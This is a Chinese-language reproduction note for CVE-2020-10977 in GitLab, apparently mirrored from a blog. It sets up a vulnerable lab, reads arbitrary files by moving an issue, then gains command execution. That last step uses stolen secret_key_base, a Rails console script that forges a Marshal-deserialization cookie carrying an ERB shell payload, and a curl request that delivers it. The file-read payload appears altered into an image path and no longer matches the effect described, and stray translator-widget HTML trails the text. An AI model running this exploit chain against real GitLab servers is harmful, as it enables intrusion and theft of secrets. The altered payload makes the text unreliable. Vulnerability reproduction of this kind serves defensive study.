# CVE-2020-10977-GITLAB CE/EE 任意文件读取导致远程命令执行漏洞-环境搭建及完整复现图文详细笔记 - Fluorescence - 博客园

> 原文：[`www.cnblogs.com/Fluorescence-tjy/p/16020817.html`](https://www.cnblogs.com/Fluorescence-tjy/p/16020817.html)

#### 漏洞环境搭建-CENTOS7

1.安装依赖软件

```
yum -y install policycoreutils openssh-server openssh-clients postfix
```

2.设置 postfix 开机自启，并启动，postfix 支持 gitlab 发信功能（对漏洞环境应该不重要）

```
systemctl enable postfix && systemctl start postfix
```

3.下载 gitlab 安装包，然后安装
官方下载：
CE 下载地址：https://packages.gitlab.com/gitlab/gitlab-ce
EE 下载地址：https://packages.gitlab.com/gitlab/gitlab-ee

清华开源镜像站下载：
centos 6 系统的下载地址:https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6
centos 7 系统的下载地址:https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7

漏洞版本范围在>=8.5，<=12.9

> (ps：测试 9.5.0 的版本时没有找到 move issue 功能。查看当前 gitlab 版本命令：cat
> /opt/gitlab/embedded/service/gitlab-rails/VERSION)

下载 rpm 包并安装:

```
wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-9.5.0-ce.0.el7.x86_64.rpm

rpm -i gitlab-ce-9.5.0-ce.0.el7.x86_64.rpm
```

4.修改 gitlab 配置文件指定服务器 ip 和自定义端口

vim /etc/gitlab/gitlab.rb
![在这里插入图片描述](img/0a1a8a7cc41f6e06257a3d4e3fbcb2fc.png)
这里我设置了 8888 端口

5.重置并启动 Gitlab
执行以下命令

```
gitlab-ctl reconfigure

gitlab-ctl restart
```

显示成功启动之后，访问端口进入 Gitlab 页面，提示修改 root 密码

> PS:若出现 502 页面，多次刷新页面即可，这是由于 Gitlab 性能要求比较高，服务器响应慢导致的，推荐虚拟机内存至少分配 4G。

# 漏洞复现

测试版本为 gitlab-12.8.7-ce

### 任意文件读取

0x001 新建两个测试项目

![在这里插入图片描述](img/0383190674b824483124e21a9e48e932.png)

0x002 在其中一个 project 中创建新的 issue，在其问题描述中输入下方代码，然后提交

```
![a](img/passwd)
```

![在这里插入图片描述](img/c99bea4e6f5d76aea12890d5bcdaca68.png)

0x003 创建 issue 成功后点击 move issue，将它移动到 test2 中

![在这里插入图片描述](img/08c698d5bf824ee8292c4f8da026816e.png)
![在这里插入图片描述](img/0631b00ec5457291c759b1f8f287f2a1.png)

0x004 test2 中的 issue 中带了一个 password 附件

![在这里插入图片描述](img/2baeada85ecb6c2addf845c05f00e7e9.png)

0x005 点击下载 password 附件，用记事本方式打开，发现其内容就是/etc/password 的内容

![在这里插入图片描述](img/c885df51435be54c3fdfb76dee9dd5d0.png)

### RCE（REMOTE COMMAND/CODE EXECUTE）

0x001 利用任意文件读取漏洞，下载/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml 文件，获取 secret_key_base

![在这里插入图片描述](img/181ad0a66515a10f8d073521e3996d75.png)

0x002 问题描述中输入：

```
![a](img/secrets.yml)
```

0x003 下载 secrets.yml，获取 secret_key_base
![在这里插入图片描述](img/4bcb7ec7bc879a740846c9a0b9807aec.png)
![在这里插入图片描述](img/490ba7c2ad54feaaa67321365a3ff845.png)

0x004 在自己的攻击机上搭建一个 gitlab 环境（详见环境搭建笔记），将目标机下载下来的 secerts.yml 覆盖在自己攻击机上/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

> （也可以只替换 secret_key_base）

0x005 使用 gitlab-rails console 执行以下命令

```
gitlab-rails console #进入 rails console 
```

*   1

依次输入：

```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `echo flag was here > /tmp/flag` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

![在这里插入图片描述](img/72e1d3be0324a9dd11429903205c3283.png)

0x006 获取 cookie，构造语句：

```
curl -vvv 'http://192.168.1.86:8888/users/sign_in' -b "experimentation_subject_id=cookie"
```

> （ps：experimentation_subject_id 参数输入 rail console 获取的 cookie 值）

![在这里插入图片描述](img/298bae1956c225ce88756c9131689704.png)

通过任意文件读取下载/tmp/flag 文件，内容：“flag was here”，说明命令执行成功！

想了解更多可以查看漏洞博客
参考：[`hackerone.com/reports/827052`](https://hackerone.com/reports/827052)

<textarea id="BFI_DATA" style="width: 1px; height: 1px; display: none"></p> <div id="WidgetFloaterPanels" class="LTRStyle" style="display: none; text-align: left; direction: ltr; visibility: hidden"> <div id="WidgetFloater" style="display: none"> <div id="WidgetLogoPanel"><span id="WidgetTranslateWithSpan"><span>TRANSLATE with </span><img id="FloaterLogo"/></span> <span id="WidgetCloseButton" title="Exit Translation">x</span></div> <div id="LanguageMenuPanel"> <div class="DDStyle_outer"><input id="LanguageMenu_svid" style="display: none" type="text" name="LanguageMenu_svid" value="en"/> <input id="LanguageMenu_textid" style="display: none" type="text" name="LanguageMenu_textid"/> <span id="__LanguageMenu_header" class="DDStyle">English</span> <div style="position: relative; text-align: left; left: 0"> <div style="position: absolute; left: 0"> <div id="__LanguageMenu_popup" class="DDStyle" style="display: none"> <table id="LanguageMenu" border="0"> <tbody> <tr> <td><a tabindex="-1" href="#ar" rel="noopener">Arabic</a></td> <td><a tabindex="-1" href="#he" rel="noopener">Hebrew</a></td> <td><a tabindex="-1" href="#pl" rel="noopener">Polish</a></td> </tr> <tr> <td><a tabindex="-1" href="#bg" rel="noopener">Bulgarian</a></td> <td><a tabindex="-1" href="#hi" rel="noopener">Hindi</a></td> <td><a tabindex="-1" href="#pt" rel="noopener">Portuguese</a></td> </tr> <tr> <td><a tabindex="-1" href="#ca" rel="noopener">Catalan</a></td> <td><a tabindex="-1" href="#mww" rel="noopener">Hmong Daw</a></td> <td><a tabindex="-1" href="#ro" rel="noopener">Romanian</a></td> </tr> <tr> <td><a tabindex="-1" href="#zh-CHS" rel="noopener">Chinese Simplified</a></td> <td><a tabindex="-1" href="#hu" rel="noopener">Hungarian</a></td> <td><a tabindex="-1" href="#ru" rel="noopener">Russian</a></td> </tr> <tr> <td><a tabindex="-1" href="#zh-CHT" rel="noopener">Chinese Traditional</a></td> <td><a tabindex="-1" href="#id" rel="noopener">Indonesian</a></td> <td><a tabindex="-1" href="#sk" rel="noopener">Slovak</a></td> </tr> <tr> <td><a tabindex="-1" href="#cs" rel="noopener">Czech</a></td> <td><a tabindex="-1" href="#it" rel="noopener">Italian</a></td> <td><a tabindex="-1" href="#sl" rel="noopener">Slovenian</a></td> </tr> <tr> <td><a tabindex="-1" href="#da" rel="noopener">Danish</a></td> <td><a tabindex="-1" href="#ja" rel="noopener">Japanese</a></td> <td><a tabindex="-1" href="#es" rel="noopener">Spanish</a></td> </tr> <tr> <td><a tabindex="-1" href="#nl" rel="noopener">Dutch</a></td> <td><a tabindex="-1" href="#tlh" rel="noopener">Klingon</a></td> <td><a tabindex="-1" href="#sv" rel="noopener">Swedish</a></td> </tr> <tr> <td><a tabindex="-1" href="#en" rel="noopener">English</a></td> <td><a tabindex="-1" href="#ko" rel="noopener">Korean</a></td> <td><a tabindex="-1" href="#th" rel="noopener">Thai</a></td> </tr> <tr> <td><a tabindex="-1" href="#et" rel="noopener">Estonian</a></td> <td><a tabindex="-1" href="#lv" rel="noopener">Latvian</a></td> <td><a tabindex="-1" href="#tr" rel="noopener">Turkish</a></td> </tr> <tr> <td><a tabindex="-1" href="#fi" rel="noopener">Finnish</a></td> <td><a tabindex="-1" href="#lt" rel="noopener">Lithuanian</a></td> <td><a tabindex="-1" href="#uk" rel="noopener">Ukrainian</a></td> </tr> <tr> <td><a tabindex="-1" href="#fr" rel="noopener">French</a></td> <td><a tabindex="-1" href="#ms" rel="noopener">Malay</a></td> <td><a tabindex="-1" href="#ur" rel="noopener">Urdu</a></td> </tr> <tr> <td><a tabindex="-1" href="#de" rel="noopener">German</a></td> <td><a tabindex="-1" href="#mt" rel="noopener">Maltese</a></td> <td><a tabindex="-1" href="#vi" rel="noopener">Vietnamese</a></td> </tr> <tr> <td><a tabindex="-1" href="#el" rel="noopener">Greek</a></td> <td><a tabindex="-1" href="#no" rel="noopener">Norwegian</a></td> <td><a tabindex="-1" href="#cy" rel="noopener">Welsh</a></td> </tr> <tr> <td><a tabindex="-1" href="#ht" rel="noopener">Haitian Creole</a></td> <td><a tabindex="-1" href="#fa" rel="noopener">Persian</a></td> <td> </td> </tr> </tbody> </table> <img alt="" style="height: 7px; width: 17px; border-width: 0; left: 20px"/></div> </div> </div> </div> </div> <div id="CTFLinksPanel"><span id="ExternalLinksPanel"><a id="HelpLink" title="Help" href="https://go.microsoft.com/?linkid=9722454" target="_blank" rel="noopener"> <img id="HelpImg"/></a> <a id="EmbedLink" title="Get this widget for your own site" rel="noopener"> <img id="EmbedImg"/></a> <a id="ShareLink" title="Share translated page with friends" rel="noopener"> <img id="ShareImg"/></a> </span></div> <div id="FloaterProgressBar"> </div> </div> <div id="WidgetFloaterCollapsed" style="display: none"><span>TRANSLATE with </span><img id="CollapsedLogoImg"/></div> <div id="FloaterSharePanel" style="display: none"> <div id="ShareTextDiv"><span id="ShareTextSpan"> COPY THE URL BELOW </span></div> <div id="ShareTextboxDiv"><input id="ShareTextbox" type="text" name="ShareTextbox" readonly="readonly"/> <img id="EmailImg"/></div> <div id="ShareFooter"><span id="ShareHelpSpan"> <img id="ShareHelpImg"/></span> <span id="ShareBackSpan"><a id="ShareBack" title="Back To Translation" rel="noopener"> Back</a></span></div> <input id="EmailSubject" type="hidden" name="EmailSubject" value="Check out this page in {0} translated from {1}"/> <input id="EmailBody" type="hidden" name="EmailBody" value="Translated: {0}%0d%0aOriginal: {1}%0d%0a%0d%0aAutomatic translation powered by Microsoft® Translator%0d%0ahttp://www.bing.com/translator?ref=MSTWidget"/> <input id="ShareHelpText" type="hidden" value="This link allows visitors to launch this page and automatically translate it to {0}."/></div> <div id="FloaterEmbed" style="display: none"> <div id="EmbedTextDiv"><span id="EmbedTextSpan">EMBED THE SNIPPET BELOW IN YOUR SITE</span> <img id="EmbedHelpImg"/></div> <div id="EmbedTextboxDiv"><input id="EmbedSnippetTextBox" type="text" name="EmbedSnippetTextBox" value="<div id='MicrosoftTranslatorWidget' class='Dark' style='color:white;background-color:#555555'></div><script type='text/javascript'>setTimeout(function(){var s=document.createElement('script');s.type='text/javascript';s.charset='UTF-8';s.src=((location && location.href && location.href.indexOf('https') == 0)?'https://ssl.microsofttranslator.com':'http://www.microsofttranslator.com')+'/ajax/v3/WidgetV3.ashx?siteData=ueOIGRSKkd965FeEGM5JtQ**&ctf=true&ui=true&settings=manual&from=en';var p=document.getElementsByTagName('head')[0]||document.documentElement;p.insertBefore(s,p.firstChild); },0);</script>" readonly="readonly"/></div> <div id="EmbedNoticeDiv"><span id="EmbedNoticeSpan">Enable collaborative features and customize widget: <a href="http://www.bing.com/widget/translator" target="_blank" rel="noopener">Bing Webmaster Portal</a></span></div> <div id="EmbedFooterDiv"><span id="EmbedBackSpan"><a title="Back To Translation" rel="noopener">Back</a></span></div> </div> </div> </body> </html></textarea>